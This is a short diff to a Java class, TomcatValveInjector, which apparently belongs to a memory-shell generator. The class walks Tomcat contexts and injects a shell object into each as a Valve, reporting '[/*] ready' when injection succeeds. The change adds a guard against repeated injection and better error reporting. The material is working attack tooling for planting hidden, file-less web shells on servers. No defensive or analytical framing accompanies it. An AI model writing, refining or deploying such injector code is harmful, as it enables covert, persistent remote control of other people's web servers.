@@ -15,6 +15,7 @@ import java.util.zip.GZIPInputStream;
 public class TomcatValveInjector {
 
     private String msg = "";
+    private static boolean ok = false;
 
     public String getClassName() {
         return "{{className}}";
@@ -25,16 +26,21 @@ public class TomcatValveInjector {
     }
 
     public TomcatValveInjector() {
+        if (ok) {
+            return;
+        }
         Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
             msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null) {
+        if (contexts == null) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
-                msg += ("context: [" + getContextRoot(context) + "] ");
                 try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
                     msg += "[/*] ready\n";
@@ -43,6 +49,7 @@ public class TomcatValveInjector {
                 }
             }
         }
+        ok = true;
         System.out.println(msg);
     }
 
